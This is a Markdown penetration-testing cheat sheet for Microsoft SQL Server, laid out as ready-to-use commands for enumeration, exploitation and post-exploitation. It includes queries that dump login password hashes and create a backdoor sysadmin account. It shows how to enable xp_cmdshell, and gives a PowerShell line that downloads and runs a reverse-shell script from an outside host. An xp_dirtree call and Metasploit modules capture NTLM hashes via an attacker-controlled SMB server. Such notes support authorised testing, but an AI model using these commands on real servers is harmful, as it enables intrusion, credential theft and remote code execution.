---
Ports: 1433
Description: MSSQL is a relational database management system developed by Microsoft.
---

>[!info]
> Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).


# Basic Usage

## Default MS-SQL System Tables

- **master Database** : Records all the system-level information for an instance of SQL Server.
- **msdb Database** : Is used by SQL Server Agent for scheduling alerts and jobs.
- **model Database** : Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterwards.
- **Resource Database** : Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.
- **tempdb Database** : Is a work-space for holding temporary objects or intermediate result sets.

## Basic MSSQL queries

```sql
# DB enumeration
select @@version;	                        # Get version

# User enumeration
SELECT system_user;							# Whoami
SELECT is_srvrolemember('bulkadmin');		# Bulkadmin?
SELECT is_srvrolemember('sysadmin');		# Sysadmin?
SELECT name FROM master..syslogins			# Enumerate other users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

# Schema and data enumeration
SELECT DB_NAME()							# Current database
SELECT name FROM master.dbo.sysdatabases	# Extract DBs
SELECT table_name FROM <DB>.information_schema.tables		                            # Extract tables
SELECT column_name FROM <DB>.information_schema.columns WHERE table_name = 'table-name'	# Extract columns
SELECT * FROM <DB>.dbo.<table>

# Search for credentials of hash
SELECT name, password_hash FROM sys.sql_logins				                            # Extract system hash
SELECT * FROM master.sys.server_principals
SELECT * FROM master.sys.syslogins

#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
```

## Extract MSSQL hashes from master.mdf

>[!assay]
>During a number of engagements, I have found myself in a position in which I have held administrative access to a server running a local instance of Microsoft SQL Server, but had not held credentials to access the service.
>
>For seasoned penetration testers out there, you will know that there are multiple ways to gain access to a SQL Server once you have access to the local server, for example running SQLQuery as the SYSTEM user which often runs under the SysAdmin permission, or injecting into the service process and spawning SSMS.
>
>It always worries me when injecting into a SQL Server process (or any critical process for that matter), especially during a live engagement in which downtime for the service can have real consequences. Up until now I have never had an option to complete a “safe” review of the credentials stored on such a database server.
>
>With this is in mind, I started to research the process of safely recovering password hashes from a SQL Server instance when deployed in “Mixed Authentication Mode”, which provides value during an assessment and helps you to potentially access the SQL server via the front door with weak passwords. The obvious target to do this was by reviewing the configuration and metadata that Microsoft SQL Server stores in its master.mdf file. There were a number of challenges in getting this to work, which I have documented below for anyone else interested in implementing or improving on this method. 
>
>https://blog.xpnsec.com/extracting-master-mdf-hashes/
>

---

# Enumeration

>[!tip]
>A comprehensive list on how to enumerate MSSQL can be found on [HackTricks, Pentesting MSSQL - Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#basic-information)

- [NSE (Nmap Scripting Engine)](../Tools/nmap.md#NSE%20(Nmap%20Scripting%20Engine))

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

- [msfconsole (auxiliary modules)](../Tools/msfconsole.md#Auxiliary%20Modules)

```bash
msf> use auxiliary/scanner/mssql/mssql_ping
```

---

# Exploitation


## Brute Force

- [medusa](../Tools/medusa.md)
- [hydra](../Tools/hydra.md#MSSQL%20Brute-Force)
- [CrackMapExec](../Tools/CrackMapExec.md#Brute-Force)

## [SQL Injection](../Web%20&%20Network%20Hacking/SQL%20Injection.md)

## One credentials are gathered [^2]

[^2]: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#tricks

### Execute commands

- [CrackMapExec > Execute Commands](../Tools/CrackMapExec.md#Execute%20Commands)

```bash
#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

#this turns on advanced options and is needed to configure xp_cmdshell
EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;
#this enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```

- [mssqlclient.py](../Tools/impacket.md#mssqlclient.py)

```bash
mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine

#Once logged in you can run queries:
SQL> select @@version;

#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat

#Try to enable code execution
SQL> enable_xp_cmdshell

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```

- sqsh

```
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
```

- [msfconsole](../Tools/msfconsole.md)

```
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```

### NTLM Service Hash gathering

>[!warning]
>You can extract the **NTLM hash** of the user making the service authenticate against you.
>- [Executing SMB Relay Attacks via SQL Server using Metasploit](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)

You should start a **SMB server** to capture the hash used in the authentication ([SMB server](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#SMB) or responder for example).

```sql
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```

---

# Post Exploitation

The user running MSSQL server will have enabled the privileged token [SeImpersonatePrivilege](../Web%20&%20Network%20Hacking/SeImpersonatePrivilege.md). You probably will be able to escalate to Administrator using this token.